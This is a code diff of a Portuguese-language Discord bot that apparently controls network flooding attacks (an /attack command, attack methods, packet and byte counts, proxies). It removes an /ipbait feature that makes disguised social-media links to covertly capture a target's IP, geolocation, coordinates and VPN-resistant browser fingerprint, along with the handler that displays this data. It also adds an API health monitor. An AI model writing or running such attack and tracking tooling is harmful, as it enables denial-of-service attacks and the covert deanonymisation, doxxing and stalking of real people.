@@ -130,17 +130,10 @@ const sessionTimers    = new Map<string, NodeJS.Timeout>();
 const ATTACK_COOLDOWN_MS = 30_000;
 const attackCooldowns = new Map<string, number>(); // userId → lastLaunchTimestamp
 
-// ── Sensitive command cooldowns ────────────────────────────────────────────
-// /ipbait: max 1 per 20s per user — prevents tracker token spam
-const IPBAIT_COOLDOWN_MS = 20_000;
-const ipbaitCooldowns = new Map<string, number>(); // userId → lastUsedTimestamp
-
-// ── Cooldown & session map GC — runs every 10min to prevent unbounded growth ──
+// ── Cooldown map GC — runs every 10min to prevent unbounded growth ──────────
 setInterval(() => {
   const now = Date.now();
   for (const [uid, ts] of attackCooldowns) if (now - ts > ATTACK_COOLDOWN_MS * 10) attackCooldowns.delete(uid);
-  for (const [uid, ts] of ipbaitCooldowns) if (now - ts > IPBAIT_COOLDOWN_MS * 10) ipbaitCooldowns.delete(uid);
-  // Also clean up any stale pending sessions whose timers may have been missed
   for (const [uid] of pendingSessions) if (!sessionTimers.has(uid)) pendingSessions.delete(uid);
 }, 10 * 60 * 1000).unref();
 
@@ -483,13 +476,6 @@ const COMMANDS = [
         .addStringOption(opt =>
           opt.setName("guildid").setDescription("ID do servidor").setRequired(true)
         )
-    )
-    .addSubcommand(sub =>
-      sub.setName("ipcheck")
-        .setDescription("🌐 Ver resultado de IP capturado por tracking link")
-        .addStringOption(opt =>
-          opt.setName("token").setDescription("Token do tracking link").setRequired(true)
-        )
     ),
 
   // ── /whois ────────────────────────────────────────────────────────────────
@@ -501,33 +487,6 @@ const COMMANDS = [
     )
     .addBooleanOption(opt =>
       opt.setName("private").setDescription("Resposta visível apenas para você? (padrão: não)").setRequired(false)
-    ),
-
-  // ── /ipbait ───────────────────────────────────────────────────────────────
-  new SlashCommandBuilder()
-    .setName("ipbait")
-    .setDescription("🪤 IP Tracker Bait — gera link camuflado para capturar IP (owner/admin only)")
-    .addStringOption(opt =>
-      opt.setName("theme")
-        .setDescription("Aparência do link bait (tema visual da página de carregamento)")
-        .setRequired(false)
-        .addChoices(
-          { name: "🎵 TikTok",      value: "tiktok"    },
-          { name: "📷 Instagram",   value: "instagram" },
-          { name: "▶️ YouTube",     value: "youtube"   },
-          { name: "𝕏 X / Twitter", value: "x"         },
-          { name: "👻 Snapchat",    value: "snapchat"  },
-          { name: "🎮 Discord",     value: "discord"   },
-        )
-    )
-    .addUserOption(opt =>
-      opt.setName("target").setDescription("Usuário Discord alvo (opcional — apenas para registro)").setRequired(false)
-    )
-    .addStringOption(opt =>
-      opt.setName("label").setDescription("Nome do alvo personalizado (aparece nos logs)").setRequired(false)
-    )
-    .addBooleanOption(opt =>
-      opt.setName("private").setDescription("Resposta visível apenas para você? (padrão: sim)").setRequired(false)
     ),
 
   // ── /admins ───────────────────────────────────────────────────────────────
@@ -873,7 +832,7 @@ function startMonitor(attackId: number, editFn: MonitorEditFn, target: string, u
             if (ch && ch.isTextBased() && "send" in ch) {
               await ch.send({
                 content: userId ? `<@${userId}>` : undefined,
-                embeds: [buildFinishEmbed(attack, proxyCount)],
+                embeds: [buildFinishEmbed(attack.id, attack.target, attack.method, attack.status, attack.packetsSent, attack.bytesSent, attack.startedAt, attack.stoppedAt)],
               });
             }
           } catch (notifyErr) {
@@ -1166,7 +1125,7 @@ async function handleMethods(interaction: ChatInputCommandInteraction): Promise<
   const layerFilter = interaction.options.getString("layer") ?? undefined;
   try {
     const methods = await api.getMethods();
-    await interaction.editReply({ embeds: [buildMethodsEmbed(methods, layerFilter)] });
+    await interaction.editReply({ embeds: buildMethodsEmbed(methods, layerFilter) });
   } catch (err: unknown) {
     const message = err instanceof Error ? err.message : String(err);
     await interaction.editReply({ embeds: [buildErrorEmbed("METHODS FAILED", message)] });
@@ -2844,293 +2803,6 @@ async function handlePanel(interaction: ChatInputCommandInteraction): Promise<vo
     return;
   }
 
-  // ── IPCHECK ───────────────────────────────────────────────────────────────
-  if (sub === "ipcheck") {
-    const token = interaction.options.getString("token", true);
-    try {
-      const res = await fetch(`${API_BASE}/api/tracker/${token}`);
-      if (!res.ok) { await interaction.editReply({ embeds: [buildErrorEmbed("TOKEN INVÁLIDO", "Nenhum registro encontrado para este token.")] }); return; }
-      const data = await res.json() as {
-        token: string; theme?: string; redirectUrl?: string;
-        userId?: string; username?: string; targetName?: string;
-        generatedAt?: number;
-        capturedIp?: string; capturedAt?: number; userAgent?: string;
-        country?: string; countryCode?: string; region?: string; city?: string;
-        isp?: string; org?: string; asn?: string; timezone?: string;
-        lat?: number; lon?: number;
-        isProxy?: boolean; isVpn?: boolean; isTor?: boolean; isHosting?: boolean; mobile?: boolean;
-        hits?: number;
-        fp_screenW?: number; fp_screenH?: number; fp_colorDepth?: number; fp_pixelRatio?: number;
-        fp_lang?: string; fp_langs?: string; fp_platform?: string;
-        fp_cores?: number; fp_memory?: number;
-        fp_connection?: string; fp_downlink?: number; fp_rtt?: number; fp_saveData?: boolean;
-        fp_tz?: string; fp_online?: boolean; fp_cookies?: boolean; fp_dnt?: string;
-        fp_touchPoints?: number; fp_localTime?: string;
-        fp_canvasHash?: string; fp_webglVendor?: string; fp_webglRenderer?: string;
-      };
-
-      const THEME_LABELS: Record<string, string> = {
-        tiktok: "🎵 TikTok", instagram: "📷 Instagram", youtube: "▶️ YouTube",
-        x: "𝕏 X / Twitter", snapchat: "👻 Snapchat", discord: "🎮 Discord", plain: "🔗 Direto",
-      };
-      const FLAG_MAP: Record<string, string> = {
-        US:"🇺🇸",BR:"🇧🇷",GB:"🇬🇧",DE:"🇩🇪",FR:"🇫🇷",RU:"🇷🇺",CN:"🇨🇳",IN:"🇮🇳",
-        JP:"🇯🇵",KR:"🇰🇷",CA:"🇨🇦",AU:"🇦🇺",MX:"🇲🇽",AR:"🇦🇷",PT:"🇵🇹",ES:"🇪🇸",
-        IT:"🇮🇹",NL:"🇳🇱",PL:"🇵🇱",TR:"🇹🇷",UA:"🇺🇦",CL:"🇨🇱",CO:"🇨🇴",
-      };
-
-      const notCaptured  = !data.capturedIp;
-      const hasFp        = !!data.fp_screenW;
-      const isMasked     = !!data.redirectUrl;
-      const flag         = data.countryCode ? (FLAG_MAP[data.countryCode] ?? "🌐") : "🌐";
-      const locationStr  = [data.city, data.region, data.country].filter(Boolean).join(", ") || "N/A";
-      const vpnStatus    = (data.isProxy || data.isVpn) ? "🔒 VPN/Proxy detectado" : data.isTor ? "🧅 Tor detectado" : data.isHosting ? "☁️ Hosting/DC" : "✅ IP residencial";
-
-      // ── Embed 1: Status + Identidade ────────────────────────────────────────
-      const embed1 = new EmbedBuilder()
-        .setColor(notCaptured ? COLORS.GOLD : 0x9B59B6)
-        .setTitle(notCaptured ? "⏳ AGUARDANDO CLIQUE" : `🎯 ALVO CAPTURADO — ${flag} ${data.country ?? ""}`)
-        .setDescription(
-          notCaptured
-            ? `O link ainda **não foi clicado**.\nFique de olho — assim que clicar, o Geass captura tudo.\n\n*Token:* \`${token}\``
-            : `*"O olho do Geass tudo vê. Nada escapa."*\n\n${isMasked ? "⚡ **URL Masking** — o alvo não percebeu nada." : ""}`
-        )
-        .addFields(
-          { name: "🎭 Aparência usada",    value: THEME_LABELS[data.theme ?? "tiktok"] ?? (data.theme ?? "N/A"), inline: true },
-          { name: "🎯 Alvo registrado",    value: data.targetName ? `\`${data.targetName}\`` : "N/A",            inline: true },
-          { name: "📊 Total de cliques",   value: `\`${data.hits ?? 0}\``,                                        inline: true },
-          { name: "🕑 Bait gerado",        value: data.generatedAt ? `<t:${Math.floor(data.generatedAt / 1000)}:R>` : "N/A", inline: true },
-          { name: "⚡ IP capturado em",    value: data.capturedAt  ? `<t:${Math.floor(data.capturedAt  / 1000)}:F>` : "⏳ Aguardando", inline: true },
-          { name: "🔗 Destino mascarado",  value: isMasked ? `\`${(data.redirectUrl ?? "").slice(0, 60)}\`` : "*padrão da plataforma*", inline: false },
-        )
-        .setTimestamp()
-        .setFooter({ text: `${AUTHOR} • Geass Intelligence — token: ${token.slice(0, 8)}...` });
-
-      if (notCaptured) {
-        await interaction.editReply({ embeds: [embed1] });
-        return;
-      }
-
-      // ── Embed 2: Rede + Geolocalização ──────────────────────────────────────
-      const embed2 = new EmbedBuilder()
-        .setColor(0x3498DB)
-        .setTitle("📡 REDE & GEOLOCALIZAÇÃO")
-        .addFields(
-          { name: "📡 IP Capturado",    value: `\`${data.capturedIp}\``,                                                   inline: true  },
-          { name: "🌍 Localização",     value: `${flag} ${locationStr}`,                                                   inline: true  },
-          { name: "🕐 Fuso horário",    value: data.timezone ?? "N/A",                                                     inline: true  },
-          { name: "🏢 ISP",             value: data.isp      ?? "N/A",                                                     inline: true  },
-          { name: "🏗️ Organização",    value: data.org      ?? "N/A",                                                     inline: true  },
-          { name: "🔢 ASN",             value: data.asn      ?? "N/A",                                                     inline: true  },
-          { name: "🔒 Anonimato",       value: vpnStatus,                                                                  inline: true  },
-          { name: "📱 Mobile",          value: data.mobile ? "✅ Sim (dados móveis / WiFi móvel)" : "❌ Não",               inline: true  },
-          { name: "🗺️ Coordenadas",    value: (data.lat && data.lon) ? `[${data.lat}, ${data.lon}](https://maps.google.com/?q=${data.lat},${data.lon})` : "N/A", inline: false },
-        );
-
-      // ── Embed 3: Dispositivo ────────────────────────────────────────────────
-      const embed3 = new EmbedBuilder()
-        .setColor(0x2ECC71)
-        .setTitle("💻 DISPOSITIVO & NAVEGADOR");
-
-      if (hasFp) {
-        const screenStr      = `${data.fp_screenW ?? "?"}×${data.fp_screenH ?? "?"} — ${data.fp_colorDepth ?? "?"}bit cor — ${data.fp_pixelRatio ?? "?"}x pixel ratio`;
-        const langStr        = [data.fp_lang, data.fp_langs ? `(${data.fp_langs})` : null].filter(Boolean).join(" ");
-        const connStr        = [
-          data.fp_connection ?? null,
-          data.fp_downlink   != null ? `${data.fp_downlink} Mbps` : null,
-          data.fp_rtt        != null ? `${data.fp_rtt}ms RTT` : null,
-          data.fp_saveData   ? "economizando dados" : null,
-        ].filter(Boolean).join(" · ") || "N/A";
-        const hardwareStr    = [
-          data.fp_cores  != null ? `${data.fp_cores} núcleos CPU` : null,
-          data.fp_memory != null ? `${data.fp_memory}GB RAM` : null,
-        ].filter(Boolean).join(" · ") || "N/A";
-        const touchStr       = data.fp_touchPoints != null ? (data.fp_touchPoints > 0 ? `✅ Touch (${data.fp_touchPoints} pontos)` : "❌ Sem touch") : "N/A";
-        const privacyStr     = [
-          data.fp_cookies === false ? "🍪 Cookies bloqueados" : null,
-          data.fp_dnt === "1"       ? "🛑 DNT ativado" : null,
-          data.fp_online === false  ? "📴 Offline" : null,
-        ].filter(Boolean).join(" · ") || "✅ Normal";
-
-        embed3.addFields(
-          { name: "🖥️ Resolução / Tela",   value: screenStr,                    inline: false },
-          { name: "🌐 Idioma",              value: langStr || "N/A",             inline: true  },
-          { name: "💻 Plataforma",          value: data.fp_platform ?? "N/A",   inline: true  },
-          { name: "⚙️ Hardware",            value: hardwareStr,                  inline: true  },
-          { name: "📶 Conexão",             value: connStr,                      inline: true  },
-          { name: "👆 Toque",              value: touchStr,                     inline: true  },
-          { name: "🔐 Privacidade",         value: privacyStr,                   inline: true  },
-          { name: "🕐 Horário local (alvo)", value: data.fp_tz ? `\`${data.fp_tz}\`` + (data.fp_localTime ? ` — \`${data.fp_localTime.replace("T"," ").slice(0,19)}\`` : "") : "N/A", inline: false },
-        );
-      } else {
-        embed3.setDescription("⏳ Fingerprint do dispositivo ainda não recebido (o alvo pode ter bloqueado JS ou o beacon falhou).");
-      }
-
-      if (data.userAgent) {
-        embed3.addFields({ name: "🔍 User-Agent completo", value: `\`\`\`${data.userAgent.slice(0, 300)}\`\`\``, inline: false });
-      }
-
-      // ── Embed 4: Fingerprint técnico (canvas + WebGL) ───────────────────────
-      const embeds: import("discord.js").EmbedBuilder[] = [embed1, embed2, embed3];
-
-      if (hasFp && (data.fp_canvasHash || data.fp_webglVendor)) {
-        const embed4 = new EmbedBuilder()
-          .setColor(0xE74C3C)
-          .setTitle("🔬 FINGERPRINT TÉCNICO")
-          .setDescription("Dados de identificação única do navegador — resistentes a VPN e proxies.")
-          .addFields(
-            { name: "🎨 Canvas Hash",      value: data.fp_canvasHash    ? `\`${data.fp_canvasHash}\``    : "N/A", inline: true },
-            { name: "🎮 WebGL Vendor",     value: data.fp_webglVendor   ? `\`${data.fp_webglVendor}\``   : "N/A", inline: true },
-            { name: "🖥️ GPU Renderer",    value: data.fp_webglRenderer ? `\`${(data.fp_webglRenderer ?? "").slice(0, 60)}\`` : "N/A", inline: false },
-          )
-          .setFooter({ text: "Canvas hash + GPU identifica o dispositivo mesmo atrás de VPN/proxy" });
-        embeds.push(embed4);
-      }
-
-      await interaction.editReply({ embeds });
-    } catch {
-      await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", "Falha ao consultar o tracker.")] });
-    }
-    return;
-  }
-}
-
-// ═══════════════════════════════════════════════════════════════════════════
-// /ipbait COMMAND HANDLER
-// ═══════════════════════════════════════════════════════════════════════════
-async function handleIpBait(interaction: ChatInputCommandInteraction): Promise<void> {
-  const callerId   = interaction.user.id;
-  const callerName = interaction.user.username;
-
-  if (!isOwner(callerId, callerName) && !isMod(callerId, callerName)) {
-    await interaction.reply({
-      embeds: [buildErrorEmbed("⛔ ACESSO NEGADO", `**${callerName}** — Apenas donos e admins autorizados podem gerar links bait.\n\n*"O Geass não concede este poder a qualquer um."*`)],
-      flags: MessageFlags.Ephemeral,
-    });
-    return;
-  }
-
-  // ── Rate limiting: 1 bait per 20s per user ────────────────────────────────
-  const lastBait = ipbaitCooldowns.get(callerId) ?? 0;
-  const elapsed  = Date.now() - lastBait;
-  if (elapsed < IPBAIT_COOLDOWN_MS) {
-    const remaining = Math.ceil((IPBAIT_COOLDOWN_MS - elapsed) / 1000);
-    await interaction.reply({
-      embeds: [buildErrorEmbed("⏳ COOLDOWN ATIVO", `Aguarde **${remaining}s** antes de gerar outro link bait.\n\n*"Até o Geass precisa de tempo para agir."*`)],
-      flags: MessageFlags.Ephemeral,
-    });
-    return;
-  }
-  ipbaitCooldowns.set(callerId, Date.now());
-
-  const isPrivate   = interaction.options.getBoolean("private") ?? true;
-  await interaction.deferReply({ flags: isPrivate ? MessageFlags.Ephemeral : undefined });
-
-  const theme       = interaction.options.getString("theme")  ?? "tiktok";
-  const targetUser  = interaction.options.getUser("target");
-  const customLabel = interaction.options.getString("label");
-
-  const targetName = customLabel
-    ?? targetUser?.displayName
-    ?? targetUser?.username
-    ?? "target";
-
-  const THEME_LABELS: Record<string, string> = {
-    tiktok: "🎵 TikTok", instagram: "📷 Instagram", youtube: "▶️ YouTube",
-    x: "𝕏 X / Twitter", snapchat: "👻 Snapchat", discord: "🎮 Discord",
-  };
-  const THEME_REDIRECT: Record<string, string> = {
-    tiktok: "https://www.tiktok.com/trending",
-    instagram: "https://www.instagram.com/",
-    youtube: "https://www.youtube.com/",
-    x: "https://x.com/home",
-    snapchat: "https://www.snapchat.com/",
-    discord: "https://discord.com/app",
-  };
-
-  try {
-    const trackerRes = await fetch(`${API_BASE}/api/tracker/gen`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        userId:     targetUser?.id     ?? callerId,
-        username:   targetUser?.username ?? callerName,
-        targetName,
-        theme,
-      }),
-    });
-
-    if (!trackerRes.ok) {
-      await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", `API retornou ${trackerRes.status}. Verifique se o API Server está online.`)] });
-      return;
-    }
-
-    const genData = await trackerRes.json() as { token: string; url: string; theme: string };
-    const { token, url } = genData;
-    const themeLabel = THEME_LABELS[theme] ?? theme.toUpperCase();
-    const themeRedirect = THEME_REDIRECT[theme] ?? "https://discord.com/app";
-
-    const embed = new EmbedBuilder()
-      .setColor(COLORS.PURPLE)
-      .setTitle(`🪤 IP TRACKER BAIT — ${themeLabel}`)
-      .setDescription(`*"Cada link é uma armadilha. O Geass captura o que os olhos não veem."*`)
-      .addFields(
-        { name: "🎭 Tema",          value: themeLabel,                                                                  inline: true  },
-        { name: "🎯 Alvo",          value: targetUser ? `<@${targetUser.id}> (\`${targetUser.username}\`)` : `*${targetName}*`, inline: true },
-        { name: "🔀 Redireciona",   value: `\`${themeRedirect}\``,                                                     inline: false },
-        { name: "🔗 Link camuflado",value: url,                                                                         inline: false },
-        { name: "🔑 Token",         value: `\`${token}\``,                                                              inline: true  },
-        { name: "⏱️ Gerado",        value: `<t:${Math.floor(Date.now() / 1000)}:R>`,                                   inline: true  },
-        { name: "📊 Ver resultado", value: `\`/panel ipcheck token:${token}\``,                                         inline: false },
-        {
-          name: "ℹ️ Como usar",
-          value: [
-            "1️⃣ Copie o **Link camuflado** e envie ao alvo",
-            "2️⃣ Ao clicar, IP + geolocalização + fingerprint são capturados",
-            "3️⃣ O link redireciona para a plataforma — parece legítimo",
-            "4️⃣ Use `/panel ipcheck` com o token para ver os dados",
-          ].join("\n"),
-          inline: false,
-        },
-      )
-      .setTimestamp()
-      .setFooter({ text: `${AUTHOR} • Geass Intelligence Division — IP Tracker v2` });
-
-    if (targetUser?.displayAvatarURL) {
-      embed.setThumbnail(targetUser.displayAvatarURL({ size: 256 }));
-    }
-
-    await interaction.editReply({ embeds: [embed] });
-
-    console.log(`[IP TRACKER] 🪤 Bait gerado por ${callerName} (${callerId}) — tema: ${theme} — alvo: ${targetName} — token: ${token.slice(0, 8)}...`);
-
-    // ── Audit log — post to configured log channel (non-blocking) ─────────
-    void (async () => {
-      try {
-        const guildId = interaction.guildId;
-        if (!guildId) return;
-        const logChannelId = getLogChannelId(guildId);
-        if (!logChannelId) return;
-        const ch = await botClient!.channels.fetch(logChannelId).catch(() => null);
-        if (!ch || !ch.isTextBased() || !("send" in ch)) return;
-        const auditEmbed = new EmbedBuilder()
-          .setColor(0xFF6B00)
-          .setTitle("🔒 AUDIT LOG — IP BAIT GERADO")
-          .addFields(
-            { name: "👁️ Operador", value: `<@${callerId}> (\`${callerName}\`)`, inline: true },
-            { name: "🎭 Tema",     value: THEME_LABELS[theme] ?? theme, inline: true },
-            { name: "🎯 Alvo",    value: targetUser ? `<@${targetUser.id}> (\`${targetUser.username}\`)` : `*${targetName}*`, inline: true },
-            { name: "🔑 Token",   value: `\`${token.slice(0, 8)}...\``, inline: true },
-            { name: "🕐 Gerado",  value: `<t:${Math.floor(Date.now() / 1000)}:R>`, inline: true },
-          )
-          .setTimestamp()
-          .setFooter({ text: AUTHOR });
-        await (ch as import("discord.js").TextChannel).send({ embeds: [auditEmbed] });
-      } catch { /* audit log failure must never break the main flow */ }
-    })();
-  } catch (err) {
-    await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", `Falha ao gerar o link bait: ${err instanceof Error ? err.message : "erro desconhecido"}`)] });
-  }
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -3630,6 +3302,54 @@ async function main(): Promise<void> {
       activities: [{ name: "⚔️ /attack start — Choose your vector" }],
       status: "online",
     });
+
+    // ── T006: Proactive API health check — alerts all log channels on failure ──
+    let apiDownCount = 0;
+    setInterval(async () => {
+      try {
+        const r = await fetch(`${API_BASE}/api/health`, { signal: AbortSignal.timeout(4000) });
+        if (r.ok) {
+          if (apiDownCount >= 2) {
+            console.log("[HEALTH] ✅ API server recovered.");
+            // Broadcast recovery to all configured log channels
+            for (const guild of c.guilds.cache.values()) {
+              const chId = getLogChannelId(guild.id);
+              if (!chId) continue;
+              const ch = await c.channels.fetch(chId).catch(() => null);
+              if (!ch || !ch.isTextBased() || !("send" in ch)) continue;
+              await (ch as import("discord.js").TextChannel).send({
+                embeds: [new EmbedBuilder()
+                  .setColor(COLORS.GREEN)
+                  .setTitle("✅ API SERVER — RECUPERADO")
+                  .setDescription("O servidor API do Lelouch Britannia está novamente **online** e respondendo.\n*\"O Geass jamais se rende — a ordem foi restaurada.\"*")
+                  .setTimestamp()
+                  .setFooter({ text: AUTHOR })],
+              }).catch(() => null);
+            }
+          }
+          apiDownCount = 0;
+        } else { apiDownCount++; }
+      } catch { apiDownCount++; }
+
+      if (apiDownCount === 2) {
+        console.warn("[HEALTH] ⚠️ API server DOWN — broadcasting alert.");
+        for (const guild of c.guilds.cache.values()) {
+          const chId = getLogChannelId(guild.id);
+          if (!chId) continue;
+          const ch = await c.channels.fetch(chId).catch(() => null);
+          if (!ch || !ch.isTextBased() || !("send" in ch)) continue;
+          await (ch as import("discord.js").TextChannel).send({
+            embeds: [new EmbedBuilder()
+              .setColor(COLORS.RED)
+              .setTitle("🚨 ALERTA — API SERVER FORA DO AR")
+              .setDescription(`O servidor API do **${BOT_NAME}** não está respondendo.\n\n⚠️ Ataques em execução podem ter sido interrompidos.\n*"Mesmo o Geass pode encontrar resistência. Investigando o problema..."*`)
+              .addFields({ name: "🔗 Endpoint", value: `\`${API_BASE}/api/health\``, inline: true })
+              .setTimestamp()
+              .setFooter({ text: `${AUTHOR} • Health Monitor` })],
+          }).catch(() => null);
+        }
+      }
+    }, 5 * 60 * 1000); // check every 5 minutes
   });
 
   client.on(Events.InteractionCreate, async interaction => {
@@ -3685,8 +3405,6 @@ async function main(): Promise<void> {
         await handleWhois(interaction);
       } else if (commandName === "panel") {
         await handlePanel(interaction);
-      } else if (commandName === "ipbait") {
-        await handleIpBait(interaction);
       } else if (commandName === "admins") {
         await handleAdmins(interaction);
       }
